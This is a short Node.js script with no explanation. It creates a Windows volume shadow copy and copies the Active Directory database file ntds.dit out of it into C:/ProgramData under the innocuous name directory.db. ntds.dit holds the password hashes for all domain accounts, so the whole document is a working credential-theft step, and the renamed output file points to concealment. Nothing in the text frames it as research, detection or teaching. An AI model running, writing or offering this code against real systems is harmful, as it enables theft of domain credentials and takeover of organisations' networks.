const fs = require('fs');
const { execSync } = require('child_process');
execSync('vssadmin.exe create shadow /for=C:');
const source = String.raw`\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy38\Windows\NTDS\ntds.dit`;
fs.copyFileSync(source, 'C:/ProgramData/directory.db');
